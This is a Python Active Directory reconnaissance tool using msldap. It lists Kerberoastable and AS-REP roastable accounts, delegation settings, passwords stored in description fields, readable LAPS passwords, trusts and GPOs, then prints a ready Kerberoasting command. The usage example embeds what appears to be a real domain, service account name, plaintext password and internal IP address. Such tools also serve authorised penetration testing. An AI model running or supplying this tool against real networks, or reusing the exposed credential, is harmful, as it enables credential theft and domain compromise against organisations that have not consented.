#!/usr/bin/env python3
"""
AD Enumeration Tool v1.1
Uses msldap built-in methods for all queries
"""
import asyncio
import sys
import os

async def get_client(url):
    from msldap.commons.factory import LDAPConnectionFactory
    f = LDAPConnectionFactory.from_url(url)
    c = f.get_client()
    r, err = await c.connect()
    if err:
        print(f"[ERROR] {err}")
        sys.exit(1)
    return c

async def enum_spn(url):
    c = await get_client(url)
    print("\n=== SPN-Enabled User Accounts ===\n")
    spn_users = []
    async for entry in c.get_all_spn_entries():
        try:
            sam = entry.sAMAccountName
            spn = entry.servicePrincipalName
            desc = entry.description if hasattr(entry, 'description') else 'N/A'
            print(f"Account: {sam}")
            print(f"  SPN: {spn}")
            print(f"  Description: {desc}")
            print()
            spn_users.append(str(sam))
        except Exception as e:
            pass
    if not spn_users:
        print("[!] No SPN-enabled user accounts found")
    else:
        print(f"\n=== Total: {len(spn_users)} SPN accounts ===")
        print("Accounts:", ', '.join(spn_users))
    return spn_users

async def enum_admins(url):
    c = await get_client(url)
    print("\n=== High-Value Accounts (adminCount=1) ===\n")
    admin_spn = []
    async for entry, err in c.pagedsearch(
        '(&(objectClass=user)(adminCount=1))',
        ['sAMAccountName', 'servicePrincipalName', 'description', 'userAccountControl']
    ):
        if err:
            continue
        if entry and 'attributes' in entry:
            attrs = entry['attributes']
            sam = attrs.get('sAMAccountName', 'N/A')
            spns = attrs.get('servicePrincipalName', [])
            desc = attrs.get('description', 'N/A')
            uac = attrs.get('userAccountControl', 'N/A')
            has_spn = bool(spns)
            marker = " [HAS SPN!]" if has_spn else ""
            print(f"  {sam} | UAC: {uac} | Desc: {desc}{marker}")
            if has_spn:
                admin_spn.append(str(sam))
    if admin_spn:
        print(f"\n[!] Admin accounts WITH SPNs: {', '.join(admin_spn)}")
    else:
        print("\n[*] No admin accounts with SPNs found")
    return admin_spn

async def enum_asrep(url):
    c = await get_client(url)
    print("\n=== AS-REP Roastable Accounts ===\n")
    users = []
    async for entry in c.get_all_knoreq_users():
        try:
            sam = entry.sAMAccountName
            desc = entry.description if hasattr(entry, 'description') else 'N/A'
            print(f"  [VULNERABLE] {sam} | Desc: {desc}")
            users.append(str(sam))
        except:
            pass
    if not users:
        print("  No AS-REP Roastable accounts found")
    else:
        print(f"\n[!] Total: {len(users)}")
    return users

async def enum_delegations(url):
    c = await get_client(url)
    print("\n=== Unconstrained Delegation ===\n")
    found = False
    async for entry in c.get_unconstrained_users():
        try:
            print(f"  [UNCONSTRAINED] {entry.sAMAccountName}")
            found = True
        except:
            pass
    if not found:
        print("  No unconstrained delegation users found")

    print("\n=== Unconstrained Delegation Machines ===\n")
    found = False
    async for entry in c.get_unconstrained_machines():
        try:
            print(f"  [UNCONSTRAINED] {entry.sAMAccountName} | {entry.dNSHostName}")
            found = True
        except:
            pass
    if not found:
        print("  No unconstrained delegation machines found")

    c2 = await get_client(url)
    print("\n=== Constrained Delegation ===\n")
    found = False
    async for entry in c2.get_all_constrained():
        try:
            sam = entry.sAMAccountName
            targets = entry.allowedtodelegateto if hasattr(entry, 'allowedtodelegateto') else 'N/A'
            print(f"  [CONSTRAINED] {sam} -> {targets}")
            found = True
        except:
            pass
    if not found:
        print("  No constrained delegation found")

async def enum_passwords(url):
    c = await get_client(url)
    print("\n=== Accounts with Password in Description ===\n")
    found = False
    async for entry, err in c.pagedsearch(
        '(&(objectClass=user)(|(description=*pass*)(description=*pwd*)(description=*cred*)(description=*secret*)))',
        ['sAMAccountName', 'description']
    ):
        if err:
            continue
        if entry and 'attributes' in entry:
            sam = entry['attributes'].get('sAMAccountName', 'N/A')
            desc = entry['attributes'].get('description', 'N/A')
            print(f"  {sam} | {desc}")
            found = True
    if not found:
        print("  None found")

async def enum_computers(url):
    c = await get_client(url)
    print("\n=== Domain Controllers ===\n")
    async for entry in c.get_all_domain_controllers():
        try:
            sam = entry.sAMAccountName
            dns = entry.dNSHostName if hasattr(entry, 'dNSHostName') else 'N/A'
            os_name = entry.operatingSystem if hasattr(entry, 'operatingSystem') else 'N/A'
            print(f"  {sam} | {dns} | {os_name}")
        except:
            pass

async def enum_gmsa(url):
    c = await get_client(url)
    print("\n=== Group Managed Service Accounts (gMSA) ===\n")
    found = False
    async for entry in c.get_all_gmsa():
        try:
            sam = entry.sAMAccountName
            desc = entry.description if hasattr(entry, 'description') else 'N/A'
            print(f"  {sam} | {desc}")
            found = True
        except:
            pass
    if not found:
        print("  No gMSA accounts found")

async def enum_laps(url):
    c = await get_client(url)
    print("\n=== LAPS Passwords (if readable) ===\n")
    found = False
    async for entry in c.get_all_laps():
        try:
            sam = entry.sAMAccountName
            pwd = entry.ms_Mcs_AdmPwd if hasattr(entry, 'ms_Mcs_AdmPwd') else None
            if pwd:
                print(f"  [LAPS PASSWORD] {sam} | {pwd}")
                found = True
        except:
            pass
    if not found:
        print("  No readable LAPS passwords")

async def enum_trusts(url):
    c = await get_client(url)
    print("\n=== Domain Trusts ===\n")
    found = False
    async for entry in c.get_all_trusts():
        try:
            name = entry.name if hasattr(entry, 'name') else 'N/A'
            direction = entry.trustDirection if hasattr(entry, 'trustDirection') else 'N/A'
            ttype = entry.trustType if hasattr(entry, 'trustType') else 'N/A'
            print(f"  {name} | Direction: {direction} | Type: {ttype}")
            found = True
        except:
            pass
    if not found:
        print("  No trusts found")

async def enum_gpos(url):
    c = await get_client(url)
    print("\n=== Group Policy Objects ===\n")
    count = 0
    async for entry in c.get_all_gpos():
        try:
            name = entry.displayName if hasattr(entry, 'displayName') else 'N/A'
            path = entry.gPCFileSysPath if hasattr(entry, 'gPCFileSysPath') else 'N/A'
            print(f"  {name} | {path}")
            count += 1
        except:
            pass
    print(f"\n  Total: {count} GPOs")

async def main():
    if len(sys.argv) < 2:
        print("""
AD Enumeration Tool v1.1

Usage: adenum.py <ldap_url> [mode]

Modes:
  spn        - SPN-enabled user accounts (default)
  admins     - Admin accounts (adminCount=1)
  asrep      - AS-REP Roastable accounts
  delegation - Delegation accounts (unconstrained + constrained)
  passwords  - Accounts with password in description
  computers  - Domain controllers
  gmsa       - Group Managed Service Accounts
  laps       - LAPS passwords (if readable)
  trusts     - Domain trusts
  gpos       - Group Policy Objects
  all        - Run ALL modules

LDAP URL: ldap+simple://DOMAIN\\user:pass@DC_IP

Example:
  adenum.py "ldap+simple://HO.AD.BDO\\p_btv34int01_svc:AMCPT5iU@172.23.205.32" all
""")
        sys.exit(1)

    url = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else 'spn'
    print(f"[*] Target: {url.split('@')[-1]}")
    print(f"[*] Mode: {mode}")

    spn_users = []
    try:
        if mode in ['spn', 'all']:
            spn_users = await enum_spn(url)
        if mode in ['admins', 'all']:
            a = await enum_admins(url)
            spn_users.extend(a)
        if mode in ['asrep', 'all']:
            await enum_asrep(url)
        if mode in ['delegation', 'all']:
            await enum_delegations(url)
        if mode in ['passwords', 'all']:
            await enum_passwords(url)
        if mode in ['computers', 'all']:
            await enum_computers(url)
        if mode in ['gmsa', 'all']:
            await enum_gmsa(url)
        if mode in ['laps', 'all']:
            await enum_laps(url)
        if mode in ['trusts', 'all']:
            await enum_trusts(url)
        if mode in ['gpos', 'all']:
            await enum_gpos(url)
    except Exception as e:
        print(f"\n[ERROR] {e}")

    if spn_users:
        u = list(set(spn_users))
        outfile = os.path.join(os.environ.get('TEMP', '.'), 'spn_users.txt')
        with open(outfile, 'w') as f:
            f.write('\n'.join(u))
        print(f"\n[*] {len(u)} SPN users saved to {outfile}")
        print(f"[*] Kerberoast with:")
        print(f'    minikerberos-kerberoast.exe "kerberos+password://..." HO.AD.BDO -o hash.txt -v {" ".join(u)}')
    print("\n[*] Done.")

if __name__ == '__main__':
    asyncio.run(main())
